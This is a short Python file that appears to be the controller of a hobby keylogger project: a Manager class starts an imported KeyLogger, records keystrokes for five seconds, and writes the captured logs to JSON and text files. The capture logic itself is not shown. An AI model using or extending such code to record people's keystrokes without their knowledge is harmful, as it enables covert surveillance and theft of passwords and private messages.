import time

from listener import KeyLogger
from write_to_file import WriteToFile

class Manager:
    def __init__(self):
        self.recorde = KeyLogger()
        self.data = ""

    def the_data(self):
        self.data = WriteToFile(self.recorde.get_logs())
        return self.data

    def start_recording(self):
        self.recorde.start_listen()

    def stop_recording(self):

        self.recorde.stop_listen()

    def write_json_file(self):
        self.the_data().write_to_json_file()


    def write_txt_file(self):
        self.the_data().write_to_file()




n = Manager()
n.start_recording()
time.sleep(5)
n.write_json_file()
n.write_txt_file()

n.stop_recording()







